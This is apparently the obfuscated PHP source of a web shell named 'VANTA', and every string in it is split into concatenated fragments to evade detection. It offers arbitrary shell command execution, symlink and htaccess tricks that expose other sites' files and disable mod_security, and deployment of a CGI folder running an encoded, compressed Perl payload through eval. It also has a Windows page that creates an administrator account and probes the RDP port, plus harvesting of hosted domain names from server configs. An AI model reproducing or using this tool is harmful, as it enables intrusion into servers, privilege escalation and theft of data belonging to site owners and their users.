  $base = 'VA'.'NT'.'A_d'.'ata';
  if (!is_dir($base)) @mkdir($base, 0755, true);
  $klist = [];
  $htlist = [
    "hx1" => 'Op'.'tio'.'ns '.'+'.'I'.'nd'.'e'.'xe'.'s +'.'F'.'oll'.'ow'.'S'.'ym'.'Lin'.'ks'.' +S'.'ym'.'Li'.'n'.'k'.'s'.'IfO'.'wne'.'rMa'.'t'.'ch'.'
'.'
Di'.'re'.'cto'.'r'.'yIn'.'dex'.' '.'{P'.'}
'.'Fo'.'r'.'c'.'eT'.'ype'.' '.'te'.'x'.'t/p'.'lai'.'n
'.'Add'.'Typ'.'e t'.'ext'.'/'.'pl'.'a'.'in'.' .p'.'hp '.'.'.'ht'.'m'.'l '.'.'.'ph'.'t'.'ml '.'.'.'i'.'nc'.' .a'.'s'.'p '.'.as'.'p'.'x '.'.js'.'p '.'.'.'pl '.'.cg'.'i '.'.py'.' '.'.sh'.' '.'.p'.'ha'.'r '.'.'.'jso'.'n '.'.ym'.'l .'.'x'.'ml '.'.'.'db'.' .s'.'ql'.'
'.'
R'.'emo'.'veH'.'and'.'ler'.' '.'.'.'ph'.'p '.'.'.'pht'.'m'.'l '.'.ph'.'a'.'r .'.'i'.'nc'.' .'.'s'.'htm'.'l .'.'h'.'tml'.' '.'.js'.' '.'.'.'c'.'ss '.'.p'.'l'.' .c'.'g'.'i '.'.a'.'sp '.'.p'.'y .'.'r'.'b'.' '.'.sh'.' .z'.'sh'.' .'.'jso'.'n'.' .'.'y'.'ml '.'.xm'.'l'.' '.'.db'.' '.'.'.'sq'.'l'.'
'.'
'.'p'.'h'.'p_f'.'l'.'ag'.' en'.'g'.'ine'.' of'.'f
'.'Set'.'Han'.'dle'.'r'.' '.'d'.'ef'.'au'.'l'.'t'.'-'.'han'.'dl'.'e'.'r',
    "hx2" => '<'.'Fil'.'e'.'sM'.'at'.'c'.'h'.' ".'.'*'.'"'.'>
'.'F'.'or'.'c'.'eT'.'ype'.' '.'te'.'xt/'.'pla'.'in
'.'
A'.'dd'.'Typ'.'e '.'te'.'xt'.'/pl'.'ain'.' '.'.ph'.'p .'.'pht'.'ml'.' .h'.'tml'.' .'.'in'.'c '.'.'.'pha'.'r'.' .'.'b'.'ak'.' .c'.'onf'.'ig'.' .d'.'b .'.'sql'.' .x'.'ml '.'.j'.'so'.'n'.'
'.'
Se'.'t'.'Han'.'dle'.'r '.'d'.'ef'.'au'.'l'.'t-h'.'an'.'dle'.'r
'.'
'.'R'.'em'.'ov'.'e'.'Ha'.'ndl'.'er'.' .p'.'hp'.' .p'.'ht'.'ml '.'.'.'pha'.'r .'.'i'.'nc'.' .'.'sht'.'ml '.'.h'.'tm'.'l'.' .j'.'s .'.'css'.' .'.'p'.'l '.'.cg'.'i '.'.as'.'p '.'.'.'py '.'.r'.'b'.' .'.'sh'.' .'.'j'.'s'.'o'.'n .'.'yml'.' .'.'xm'.'l'.' .d'.'b'.' .'.'sql'.'
p'.'h'.'p_f'.'l'.'ag '.'eng'.'ine'.' of'.'f
'.'
</'.'F'.'il'.'es'.'M'.'atc'.'h'.'>',
    "hx3" => 'R'.'ewr'.'i'.'teE'.'ngi'.'ne'.' O'.'n
'.'R'.'e'.'w'.'r'.'i'.'teB'.'a'.'se'.' '.'/'.'
'.'Rew'.'rit'.'eR'.'ule'.' ^('.'.+)'.'$'.' '.'{P'.'}
'.'O'.'pt'.'i'.'o'.'ns'.' +F'.'o'.'llo'.'wSy'.'mLi'.'nks'.' +'.'In'.'de'.'xes'.'
'.'
'.'Dir'.'ect'.'ory'.'Ind'.'e'.'x'.' '.'{'.'P}'.'
'.'S'.'et'.'Ha'.'n'.'d'.'l'.'er '.'d'.'e'.'f'.'a'.'u'.'l'.'t-h'.'and'.'ler'.'
p'.'hp_'.'fla'.'g '.'eng'.'i'.'n'.'e'.' '.'of'.'f',
    "hx4" => 'Re'.'m'.'o'.'veH'.'an'.'dle'.'r '.'.'.'p'.'h'.'p '.'.'.'p'.'htm'.'l '.'.p'.'ha'.'r '.'.in'.'c
'.'p'.'hp'.'_fl'.'ag'.' '.'en'.'gi'.'ne '.'off'.'
'.'Add'.'Ty'.'p'.'e t'.'e'.'xt'.'/pl'.'a'.'in'.' .p'.'hp'.' .h'.'t'.'m'.'l .'.'inc'.' .'.'p'.'htm'.'l .'.'pha'.'r '.'.ba'.'k'.' .c'.'o'.'n'.'f'.'ig'.' .'.'db '.'.s'.'ql'.' .'.'x'.'ml '.'.js'.'o'.'n
'.'
S'.'e'.'t'.'Ha'.'ndl'.'er'.' de'.'fa'.'u'.'lt'.'-ha'.'n'.'d'.'ler'.'
'.'O'.'pti'.'on'.'s +'.'Ind'.'exe'.'s '.'+F'.'ol'.'l'.'ow'.'Sym'.'Lin'.'ks
'.'
'.'Di'.'rec'.'to'.'r'.'y'.'In'.'dex'.' {P'.'}',
    "hx5" => 'Opt'.'ion'.'s +'.'Ind'.'exe'.'s '.'+F'.'o'.'ll'.'owS'.'ymL'.'i'.'nk'.'s'.'
'.'Di'.'rec'.'t'.'o'.'ryI'.'n'.'dex'.' {'.'P}'.'
'.'Ad'.'dT'.'ype'.' t'.'e'.'xt/'.'pl'.'a'.'i'.'n .'.'ph'.'p .'.'i'.'nc'.' .'.'ph'.'tm'.'l'.' .'.'p'.'h'.'ar
'.'
<'.'If'.'M'.'o'.'du'.'le'.' Li'.'teS'.'pe'.'e'.'d>'.'
'.' '.' '.'php'.'_f'.'l'.'a'.'g'.' '.'eng'.'in'.'e'.' '.'o'.'ff'.'
'.'  '.'Set'.'H'.'a'.'nd'.'ler'.' '.'d'.'ef'.'aul'.'t-h'.'an'.'d'.'le'.'r
'.'
</'.'I'.'fM'.'od'.'ule'.'>',
    "hx6" => '<If'.'Mo'.'d'.'ule'.' m'.'od'.'_s'.'e'.'cur'.'it'.'y.c'.'>
'.'  '.'S'.'e'.'c'.'Fi'.'l'.'te'.'r'.'En'.'g'.'in'.'e'.' O'.'ff'.'
'.'  '.'S'.'e'.'cF'.'i'.'lte'.'rSc'.'an'.'PO'.'S'.'T O'.'ff
'.'
<'.'/If'.'Mod'.'u'.'le'.'>
'.'
'.'Opt'.'io'.'n'.'s'.' +I'.'nde'.'xe'.'s'.' +F'.'ol'.'l'.'ow'.'Sy'.'m'.'Lin'.'ks'.'
D'.'i'.'r'.'ec'.'tor'.'y'.'Ind'.'e'.'x '.'{'.'P}
'.'
'.'S'.'etH'.'an'.'dle'.'r d'.'ef'.'aul'.'t-h'.'a'.'n'.'dle'.'r
'.'
'.'A'.'ddT'.'yp'.'e t'.'e'.'xt/'.'pla'.'in'.' .p'.'h'.'p .'.'ph'.'tm'.'l .'.'htm'.'l '.'.i'.'n'.'c '.'.'.'p'.'har'.'
'.'
ph'.'p_'.'f'.'la'.'g e'.'n'.'g'.'in'.'e'.' '.'off'
  ];
  $output = '';
  $final_ln = g3t_rnd(7);
  $created = false;
  $alt_file = "";
  $result = "";
  if(function_exists(a1s('c2'.'hl'.'b'.'G'.'xf'.'ZX'.'hl'.'Yw'.'=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$base/$final_ln")."'";
    $exec_fn=a1s('c'.'2hl'.'b'.'G'.'xfZ'.'Xh'.'lYw'.'==');
    @$exec_fn($cmd);
  ...
  if(!$created && function_exists(a1s('ZXh'.'l'.'Y'.'w='.'='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$base/$final_ln")."'";
    $exec_fn=a1s('Z'.'Xh'.'lYw'.'==');
    @$exec_fn($cmd,$o,$rc);
    if(is_link("$base/$final_ln")) {
    $created = true;
    $alt_file = "$base/$final_ln";
  ...
  if(!$created && function_exists(a1s('c'.'2'.'hl'.'b'.'G'.'xfZ'.'X'.'hl'.'Y'.'w=='))) {
    $cpfile = $base.'/d'.'u'.'p_'.g3t_rnd(5);
    $cmd = "cp '".addslashes($p1)."' '".addslashes($cpfile)."'";
    $exec_fn=a1s('c2h'.'lbG'.'xfZ'.'Xhl'.'Yw'.'='.'=');
    @$exec_fn($cmd);
  ...
  if(!$created && function_exists(a1s('c2h'.'lbG'.'xfZ'.'Xhl'.'Yw='.'='))) {
    $ddfile = $base.'/'.'d'.'d'.'_'.g3t_rnd(4);
    $cmd = "dd if='".addslashes($p1)."' of='".addslashes($ddfile)."' 2>/dev/null";
    $exec_fn=a1s('c2h'.'lbG'.'xf'.'Z'.'X'.'hl'.'Yw='.'=');
    @$exec_fn($cmd);
  ...
  if(!$created && function_exists(a1s('c'.'2'.'h'.'lb'.'Gx'.'fZX'.'h'.'l'.'Yw='.'='))) {
    $catfile = $base.'/'.'c'.'at_'.g3t_rnd(4);
    $cmd = "cat '".addslashes($p1)."' > '".addslashes($catfile)."'";
    $exec_fn=a1s('c2'.'hlb'.'Gx'.'fZ'.'Xhl'.'Yw='.'=');
    @$exec_fn($cmd);
  ...
  if(!$created && @copy($p1, $base.'/ph'.'pl'.'oca'.'l'.'_'.g3t_rnd(5))) {
    $created = true;
    $alt_file = $base.'/p'.'hp'.'l'.'o'.'ca'.'l'.'_'.g3t_rnd(5);
  ...
  foreach ($htlist as $hname => $htval) {
    ...
    if(function_exists(a1s('c2'.'hlb'.'G'.'x'.'f'.'Z'.'Xh'.'l'.'Yw'.'=='))) {
    $cmd = "ln -s '".addslashes($p1)."' '".addslashes("$subdir/$final_ln")."'";
    $exec_fn=a1s('c2'.'h'.'lb'.'Gx'.'f'.'ZX'.'hl'.'Yw='.'=');
    @$exec_fn($cmd);
    }
    $klist[] = "$subdir/$final_ln";
  }
  echo '<d'.'i'.'v '.'cla'.'s'.'s'.'="'.'v4'.'nt4'.'-'.'sy'.'m-r'.'esu'.'lt'.'"><'.'div'.' cl'.'ass'.'="v'.'4'.'nt4'.'-s'.'y'.'m'.'-li'.'st"'.'>';
  echo $output;
  echo "byp4ss dirs:<ul>";
...
<?php elseif (isset($_GET['van'.'t'.'a-'.'cmd'])): ?>
<div class="vanta-cmd-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="vanta-cmd-header" style="display:flex;align-items:center;gap:11px;">
    <div class="vanta-cmd-ico"><i class="fas fa-terminal"></i></div>
    <div>
  ...
  <div class="vanta-cmd-content" style="margin-top:23px;">
    ...
    <div class="vanta-cmd-inputbox" style="margin-bottom:17px;">
     ...
     <input type="text" class="vanta-cmd-cmdinput" name="vanta-cmd_cmd" value="<?= htmlspecialchars($_POST['v'.'an'.'ta'.'-c'.'md_'.'c'.'md'] ?? 'i'.'d') ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
    </div>
...
<div class="v4nt4-card-main" style="max-width:610px;margin:38px auto 0 auto;background:var(--panel);border-radius:18px;box-shadow:0 4px 32px #00e0ff12;padding:37px 29px 29px 29px;">
  ...
  <div class="pzcard-content">
    ...
    <?php
    function prvdz_rndstr($l=8) { $a='abc'.'de'.'f'.'ghi'.'j'.'klm'.'no'.'pqr'.'s'.'tuv'.'w'.'x'.'yz'.'012'.'34'.'56'.'789'; $s=''; for($i=0;$i<$l;$i++) $s.=$a[rand(0,strlen($a)-1)]; return $s; }
    function prvdz_ascdump($s) { $r=''; foreach(str_split($s) as $c) $r.='&'.'#'.ord($c).';'; return $r; }
    $protocol = (isset($_SERVER['HTT'.'P'.'S']) && $_SERVER['H'.'TTP'.'S']!='of'.'f') ? 'ht'.'tp'.'s' : 'ht'.'t'.'p';
    $domain = $protocol.':/'.'/'.$_SERVER['H'.'T'.'TP'.'_HO'.'S'.'T'];
    $dir   = rtrim(dirname($_SERVER['SCR'.'IPT'.'_N'.'AME']),"/");
    $paths = [];
    if(isset($_POST['dep'.'loy'.'_'.'c'.'g'.'i_s'.'u'.'it'.'e'])) {
    $cgidir = 'v4n'.'t'.'4_'.'cg'.'i';
...
HTA;
    file_put_contents($cgidir.'/.'.'h'.'tac'.'c'.'ess', $htaccess);
    $plf = $cgidir.'/'.'VA'.'N'.'TA'.'.d4'.'y'.'z';
    $pl_payload = '#'.'!/u'.'s'.'r/'.'b'.'in/'.'per'.'l '.' '.' '.'-I'.'/u'.'sr'.'/lo'.'c'.'a'.'l/'.'ban'.'dm'.'i'.'n
'.'us'.'e'.' '.'MI'.'M'.'E::'.'Ba'.'se'.'64;'.'use'.' Co'.'mp'.'r'.'es'.'s::'.'Zl'.'ib;'.'e'.'va'.'l('.'Com'.'pr'.'es'.'s:'.':Zl'.'i'.'b::'.'mem'.'G'.'un'.'zi'.'p('.'dec'.'o'.'de'.'_b'.'a'.'se'.'64('.'"'.'H4s'.'IA'.'AA'.'AA'.'A'.'AC'.'A'.'71a'.'63'.'baS'.'BL+'.'n3P'.'y'.'D'.'h2'.'Z'.'sVB'.'i'.'dM'.'F2
y'.'T'.'PSL'.'BL'.'eko'.'io'.'T8'.'Hgq'.'apk'.'igA'.'Me'.'w'.'Jg8'.'ymi'.'vSk'.'ii4'.'G'.'3Sa'.'JC'.'PTD'.'5L'.'oy9'.'ZTN'.'/'.'K0'.'H'.'kS0'.'4y'.'B+1'.'aF'.'GLq'.'uu'.'sz'.'02'.'1q9'.'NXS'.'/XF'.'m8s'.'z8d'.'o6'.'2Cw'.'nnP'.'Zq'.'Fr'.'sn'.'IW'.'ll'.'/0'.'R'.'NK'.'//3'.'orT'.'t'.'107'.'p'.'XT'.'fV'.'E'.'B/'.'TyN'.'fi'.'u'.'4p'.'4J'.'Uq'.'mJ'.'Z'.'+t'.'jLy'.'YUe'.'cTA'.'K5'.'+W'.'KL'.'sas'.'vaT'.'X'.'K5i'.'k+'.'o'.'4cD'.'T8B'.'k3'.'ca'.'XaD'.'V'.'6'.'T'.'3pW'.'kMu'.'8J'.'UL'.'kk9'.'/6'.'K'.'vhm'.'2'.'W'.'b'.'aXK'.'Tnv'.'tRM'.'/S'.'Z0q'.'a75'.'R'.'281'.'7'.'G9t'.'2Mc'.'Rk'.'F'.'w9D'.'/wO'.'1LT'.'j'.'YtC'.'M'.'AAA'.'=='.'")'.'))'.';';
    ...
    $phf = $cgidir.'/'.prvdz_rndstr(9).'.ph'.'p';
...
PHP;
    ...
    echo '<di'.'v'.' c'.'la'.'ss='.'"pz'.'ca'.'r'.'d-'.'a'.'le'.'r'.'t"'.'><'.'i'.' c'.'las'.'s'.'="f'.'as '.'fa'.'-bi'.'oh'.'a'.'za'.'rd"'.'><'.'/i'.'> <'.'b'.'>CG'.'I d'.'e'.'plo'.'ye'.'d!'.' Al'.'l '.'chm'.'o'.'d '.'7'.'5'.'5.'.'<'.'/'.'b><'.'br'.'>'.'<'.'u'.'l c'.'las'.'s='.'"pz'.'car'.'d-'.'sh'.'e'.'l'.'ls-'.'l'.'ist'.'">';
    foreach($paths as $sh) {
     $rel = $sh[1];
     $url = $fullbase . '/' . $rel;
     $link = $url . '';
     echo '<li'.'>'.'<b'.' s'.'ty'.'le='.'"'.'col'.'or'.':#e'.'5'.'39'.'35"'.'>'.htmlspecialchars($sh[0]).'</b'.'>: '.'<'.'co'.'de'.'>'.htmlspecialchars($rel).'<'.'/c'.'ode'.'>'.'
 '.' '.'  '.' <'.'a '.'hr'.'ef='.'"'.$link.'"'.' t'.'a'.'r'.'get'.'="'.'_'.'b'.'lan'.'k'.'">'.'Ope'.'n</'.'a>'.'
 '.'   '.' '.'<s'.'p'.'an>'.'(ch'.'mod'.' '.'75'.'5'.')'.'</'.'s'.'p'.'an>'.'
'.'  '.' '.'  '.'</'.'l'.'i>';
    }
    echo '<'.'/u'.'l>'.'<'.'/di'.'v>';
    }
...
<?php elseif (isset($_GET['wi'.'n'.'r'.'0'.'0t'])): ?>
  ...
  <div class="vanta-cmd-content" style="margin-top:25px;">
    <form method="post" id="winr00t-form" style="margin-bottom:18px;">
      <div style="display:flex;gap:9px;align-items:center;flex-wrap:wrap;">
        <input type="text" name="user" class="vanta-cmd-cmdinput" value="<?= htmlspecialchars($_POST['us'.'e'.'r']??'V'.'ANT'.'Aa'.'d'.'mi'.'n') ?>" placeholder="user" style="width:170px;">
        <input type="text" name="pass" class="vanta-cmd-cmdinput" value="<?= htmlspecialchars($_POST['p'.'as'.'s'] ?? substr(str_shuffle('abc'.'d'.'efg'.'hij'.'k'.'lm'.'n'.'opq'.'rst'.'uvw'.'x'.'y'.'zA'.'BC'.'DE'.'F'.'G'.'H'.'IJ'.'K'.'LM'.'NO'.'PQ'.'R'.'ST'.'UV'.'WXY'.'Z01'.'2'.'3'.'4'.'5'.'678'.'9'), 0, 12)) ?>" placeholder="pass" style="width:160px;" readonly>
...
function detect_rdp_port() {
    $reg = v4nt4C('re'.'g '.'qu'.'er'.'y'.' '.'"'.'HKL'.'M\\\\'.'SYS'.'TEM'.'\\'.'\\Cu'.'r'.'ren'.'t'.'Co'.'n'.'t'.'r'.'o'.'lS'.'et'.'\\\\C'.'o'.'ntr'.'ol\\'.'\\T'.'er'.'min'.'al '.'Se'.'rv'.'er'.'\\'.'\\W'.'in'.'S'.'t'.'at'.'io'.'n'.'s\\\\'.'RD'.'P-'.'Tc'.'p'.'" '.'/v'.' P'.'or'.'tNu'.'mb'.'er'.' '.'2>&'.'1');
    if (preg_match('/Po'.'r'.'tN'.'um'.'b'.'er\\'.'s+R'.'E'.'G_'.'D'.'WOR'.'D'.'\\s+'.'0'.'x'.'(['.'0-9'.'a'.'-f]'.'+'.')/i', $reg, $m)) {
        return hexdec($m[1]);
    }
    $netstat = v4nt4C('ne'.'t'.'s'.'ta'.'t'.' -'.'an'.' '.'|'.' fi'.'n'.'d '.'":'.'338'.'9"');
    if (strpos($netstat, '33'.'8'.'9') !== false) {
        return 3389;
    }
    return 'Un'.'kn'.'o'.'wn';
}
...
<?php
    if ($_SERVER['R'.'EQ'.'U'.'ES'.'T'.'_'.'MET'.'HO'.'D'] === 'POS'.'T' && isset($_POST['adm'.'c'], $_POST['us'.'e'.'r'], $_POST['pa'.'ss'])) {
        $u = $_POST['u'.'s'.'er'];
        $p = $_POST['pas'.'s'];
        $c = $_POST['ad'.'mc'];
        $success_cmd = false;
...
<div class="v4nt4-lite-info">
    ...
    <span class="v4nt4-lite-val <?= ini_get('saf'.'e'.'_m'.'od'.'e') ? 'v4'.'nt'.'4'.'-'.'li'.'t'.'e-o'.'n' : 'v4n'.'t4-'.'lit'.'e-o'.'f'.'f' ?>">
    <?= ini_get('saf'.'e_m'.'od'.'e') ? 'O'.'N' : 'O'.'FF'; ?>
    </span>
  </div>
<div class="v4nt4-lite-row"><span class="v4nt4-lite-key">disable functions:</span>
  <?php
    $d1sxb = trim(ini_get('d'.'is'.'abl'.'e'.'_f'.'unc'.'ti'.'o'.'n'.'s'), ", \t\n\r\0\x0B");
    if (!$d1sxb) {
    echo '<s'.'pa'.'n'.' c'.'las'.'s="'.'v4n'.'t4-'.'lit'.'e-'.'va'.'l '.'v4'.'nt'.'4-'.'lit'.'e'.'-'.'o'.'n"'.' s'.'t'.'y'.'le='.'"b'.'ac'.'kg'.'r'.'o'.'un'.'d'.':'.'#e'.'a'.'fff'.'5;"'.'>N'.'o'.'ne'.'</'.'sp'.'an'.'>';
    } else {
    echo '<'.'sp'.'a'.'n c'.'l'.'as'.'s='.'"v4'.'nt'.'4'.'-l'.'ite'.'-v'.'al'.' v4'.'nt'.'4-'.'li'.'te'.'-o'.'ff"'.' s'.'ty'.'le'.'='.'"'.'whi'.'t'.'e'.'-s'.'pa'.'c'.'e:'.'nor'.'m'.'a'.'l'.';'.'"'.'>'
       . str_replace(",", ", ", $d1sxb)
       . '</'.'sp'.'an'.'>';
    }
  ?>
...
$build = "";
echo '<'.'a'.' '.'hre'.'f="'.'?'.'V'.'AN'.'TA=' . (is_callable($fxnxs) ? $fxnxs('/') : vanta_PR1V('/')) . '" '.'cla'.'ss'.'="'.'v4n'.'t4'.'-'.'li'.'t'.'e'.'-'.'bc'.'"'.'>/'.'</'.'a>';
foreach ($pwd as $i => $v) {
    $build .= "/" . $v;
    echo '<a'.' hr'.'ef='.'"'.'?VA'.'NT'.'A'.'=' . (is_callable($fxnxs) ? $fxnxs($build) : vanta_PR1V($build)) . '" c'.'la'.'ss'.'='.'"v4'.'nt'.'4-'.'li'.'t'.'e-b'.'c'.'"'.'>' . $v . '</a'.'>'.'/';
}
?>
</div>
    ...
    <?php foreach ($VANTAf1l3 as $_F): ?>
     <?php if ($VANTAxas[3]($_F)): ?>
       ...
       <span class="v4nt4-file-col v4nt4-file-icon">
        ...
        <?php elseif (in_array($ext, ['j'.'pg','jpe'.'g','p'.'n'.'g','g'.'if','web'.'p','sv'.'g'])): ?>
          <i class="fa-regular fa-image"></i>
        <?php elseif (in_array($ext, ['z'.'ip','r'.'a'.'r','g'.'z','ta'.'r','7'.'z'])): ?>
          <i class="fa-solid fa-box-archive"></i>
        <?php elseif (in_array($ext, ['t'.'x'.'t','m'.'d','l'.'o'.'g'])): ?>
          <i class="fa-regular fa-note-sticky"></i>
        <?php elseif ($ext === 'j'.'s'): ?>
          <i class="fa-brands fa-js"></i>
        <?php elseif ($ext === 'c'.'s'.'s'): ?>
          <i class="fa-brands fa-css3-alt"></i>
        <?php elseif (in_array($ext, ['h'.'t'.'m'.'l','h'.'tm'])): ?>
          <i class="fa-brands fa-html5"></i>
        <?php elseif (in_array($ext, ['j'.'son','ya'.'m'.'l','y'.'ml','x'.'ml'])): ?>
          <i class="fa-solid fa-code"></i>
        <?php elseif (in_array($ext, ['m'.'p3','w'.'av','fl'.'ac'])): ?>
          <i class="fa-solid fa-headphones"></i>
        <?php elseif (in_array($ext, ['m'.'p'.'4','a'.'vi','m'.'ov','w'.'eb'.'m','m'.'k'.'v'])): ?>
       ...
       <span class="v4nt4-file-perm <?= is_writable($VANTAxas[0]() . '/' . $_F) ? 'v'.'4nt'.'4-f'.'il'.'e'.'-w'.'ri'.'t'.'abl'.'e' : 'v4n'.'t'.'4-f'.'ile'.'-re'.'a'.'d'.'on'.'ly' ?>">
        <i class="fas <?= is_writable($VANTAxas[0]() . '/' . $_F) ? 'fa-'.'unl'.'ock'.'-'.'a'.'lt '.'v4n'.'t4'.'-pe'.'rm'.'-'.'g'.'re'.'en' : 'f'.'a-l'.'ock'.' v4'.'nt4'.'-'.'per'.'m-'.'re'.'d' ?>"></i>
        <?= p3rms($VANTAxas[0]() . '/' . $_F); ?>
       </span>
...
if(@$fcZ($Zyu($_d1z))){
  $l = @$flZ($Zyu($_d1z));
  foreach($l as $line){
    if(preg_match('#zo'.'ne'.'\\s+'.'"('.'['.'^"'.']+'.')"'.'#',$line,$m)){
    $d=$ftrZ($m[1]);
    if($d && $d!=='l'.'oc'.'alh'.'o'.'st') $_mn6z[]=$d;
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d2z))){
  $c=@$fgZ($Zyu($_d2z));
  preg_match_all('#Se'.'rve'.'r'.'N'.'a'.'me'.'\\'.'s'.'+(['.'^'.'\\s'.']'.'+'.')#'.'i', $c, $matches);
...
if(empty($_mn6z) && @$fidZ($Zyu($_d3z))){
  foreach(@$fgbZ($Zyu($_d3z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#^'.'d'.'oma'.'in'.':'.'\\s*'.'(\\'.'S'.'+)#',$line,$m)){
     $_mn6z[]=$m[1];
    }
    }
  }
...
if(empty($_mn6z) && @$fidZ($Zyu($_d4z))){
  foreach(@$fgbZ($Zyu($_d4z).'*'.'/'.'do'.'mai'.'ns'.'.'.'li'.'s'.'t') as $file){
    $l=@$fdZ($file, 128);
...
if(empty($_mn6z)){
  foreach(@$fgbZ($Zyu($_d6z). '*'.'.db') as $file){
    $n=@$fbsZ($file,'.d'.'b');
    if($n && $n!=='l'.'oc'.'a'.'l'.'h'.'os'.'t') $_mn6z[]=$n;
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d7z))){
  foreach(@$fgbZ($Zyu($_d7z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#s'.'er'.'v'.'e'.'r'.'_na'.'me'.'\\'.'s+('.'[^;'.']+)'.'#',$line,$m)){
     $arr=explode(' ',$m[1]);
     foreach($arr as $d){
       $d=trim($d," ;\t\n\r");
       if($d && $d!=='_' && $d!=='loc'.'a'.'lh'.'os'.'t') $_mn6z[]=$d;
     }
    }
    }
  }
...
if(empty($_mn6z) && @$fidZ($Zyu($_d8z))){
  foreach(@$fgbZ($Zyu($_d8z).'*') as $dir){
    if(@$fidZ($dir) && preg_match('#/'.'v'.'h'.'os'.'ts/'.'('.'[^'.'/]'.'+)'.'$'.'#',$dir,$m)){
    $_mn6z[]=$m[1];
    }
  }
}
...
if(empty($_mn6z) && strtoupper(substr(PHP_OS,0,3))===$Zyu([87,73,78])){
  ...
  if(@$fcZ($env)){
    $l=@$flZ($env);
    foreach($l as $line){
    if(preg_match('/'.'bi'.'nd'.'i'.'n'.'g'.'I'.'nf'.'orm'.'a'.'t'.'io'.'n="'.'['.'^:'.']+'.':('.'['.'^:]'.'+'.'):'.'(['.'^"'.']+)'.'"'.'/',$line,$m)){
     $d=trim($m[2]);
     if($d && $d!=='lo'.'cal'.'hos'.'t' && strpos($d,'*')===false) $_mn6z[]=$d;
    }
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_hcz))){
  $l=@$flZ($Zyu($_hcz));
  foreach($l as $line){
    if(preg_match('/\\'.'s(['.'a-'.'z'.'0-'.'9'.'\\.-'.']+\\'.'.[a'.'-z'.']'.'{2'.',})'.'/i',$line,$m)){
    $d=$fsZ($ftrZ($m[1]));
    if($d && strpos($d,'lo'.'c'.'a'.'l'.'ho'.'s'.'t')===false) $_mn6z[]=$d;
    }
  }
}
...
<?php endif; ?>
<?php if (isset($_GET['cre'.'a'.'te'.'fol'.'de'.'r'])): ?>
<div class="v4nt4-modal-bg">
  <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    ...
    <?php
    if (isset($_POST['c'.'r'.'ea'.'t'.'e_f'.'old'.'er']) && $_POST['c'.'rea'.'te_'.'f'.'ol'.'der']) {
    $folder = basename($_POST['cr'.'ea'.'t'.'e_f'.'o'.'l'.'d'.'e'.'r']);
    $full_path = rtrim($VANTAxas[0](), "/") . "/" . $folder;
    if (!file_exists($full_path)) {
     $created = @mkdir($full_path, 0755, true);
     if ($created) {
       echo '<'.'di'.'v '.'sty'.'le'.'="'.'c'.'ol'.'o'.'r:'.'#10'.'b9'.'81;'.'ma'.'rgi'.'n:'.'1'.'2px'.' 0'.' 0 '.'0;'.'fon'.'t-'.'s'.'iz'.'e:'.'1.'.'0'.'8e'.'m;'.'tex'.'t'.'-a'.'lig'.'n:'.'cen'.'ter'.';"'.'><i'.' cl'.'as'.'s'.'='.'"f'.'a'.'s f'.'a'.'-ch'.'ec'.'k'.'-ci'.'r'.'cle'.'">'.'</'.'i'.'>'.' '.'F'.'old'.'er'.' '.'cre'.'at'.'ed'.':'.' <'.'b>' . htmlspecialchars($folder) . '</b'.'><'.'/di'.'v>';
     } else {
       echo '<'.'di'.'v '.'s'.'t'.'yle'.'="'.'co'.'lor'.':#e'.'539'.'35;'.'ma'.'rgi'.'n:'.'1'.'2'.'px '.'0'.' 0'.' 0'.';f'.'o'.'n'.'t-'.'s'.'ize'.':1.'.'0'.'8'.'em;'.'t'.'ex'.'t'.'-'.'al'.'ign'.':ce'.'nt'.'er'.';">'.'<i'.' '.'cla'.'s'.'s'.'="f'.'as'.' fa'.'-'.'ti'.'m'.'es-'.'c'.'i'.'r'.'cle'.'"'.'>'.'</i'.'> '.'Fai'.'led'.' '.'t'.'o '.'c'.'re'.'a'.'te'.' f'.'ol'.'der'.'!<'.'/d'.'i'.'v>';
     }
    } else {
     echo '<'.'di'.'v'.' '.'st'.'yl'.'e="'.'co'.'lor'.':'.'#b7'.'1c'.'1c;'.'ma'.'r'.'gin'.':'.'12'.'p'.'x '.'0 0'.' '.'0'.';f'.'on'.'t-'.'si'.'ze:'.'1'.'.0'.'8'.'e'.'m'.';t'.'e'.'xt-'.'al'.'ig'.'n:c'.'ent'.'er;'.'"'.'><i'.' c'.'las'.'s='.'"f'.'as'.' f'.'a-e'.'x'.'cl'.'am'.'ati'.'on-'.'ci'.'rcl'.'e'.'"><'.'/i>'.' Fo'.'lde'.'r a'.'l'.'rea'.'dy'.' ex'.'is'.'ts!'.'</'.'di'.'v'.'>';
    }
    }
    ?>
  </div>
...
<?php endif; ?>
<?php if (isset($_GET['cre'.'at'.'efi'.'le'])): ?>
<div class="v4nt4-modal-bg">
  <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
    ...
    <?php
    if (isset($_POST['cr'.'ea'.'t'.'e_'.'f'.'il'.'e']) && $_POST['cr'.'eat'.'e_f'.'i'.'le']) {
    $new_file = basename($_POST['cr'.'eat'.'e_'.'f'.'i'.'le']);
    $full_path = rtrim($VANTAxas[0](), "/") . "/" . $new_file;
    if (!file_exists($full_path)) {
     $created = @file_put_contents($full_path, "");
     if ($created !== false) {
       echo '<'.'d'.'iv'.' '.'s'.'ty'.'l'.'e='.'"c'.'ol'.'or'.':#1'.'0b'.'981'.';'.'ma'.'r'.'gin'.':1'.'2px'.' 0'.' 0'.' 0'.';'.'fon'.'t-s'.'ize'.':1'.'.'.'0'.'8em'.';t'.'ex'.'t-a'.'l'.'i'.'gn:'.'ce'.'nte'.'r;"'.'><'.'i '.'cla'.'ss'.'="f'.'as'.' fa'.'-'.'che'.'ck-'.'cir'.'cle'.'">'.'<'.'/i>'.' Fi'.'le '.'cr'.'e'.'ate'.'d: '.'<'.'b'.'>' . htmlspecialchars($new_file) . '</'.'b><'.'/d'.'iv>';
     } else {
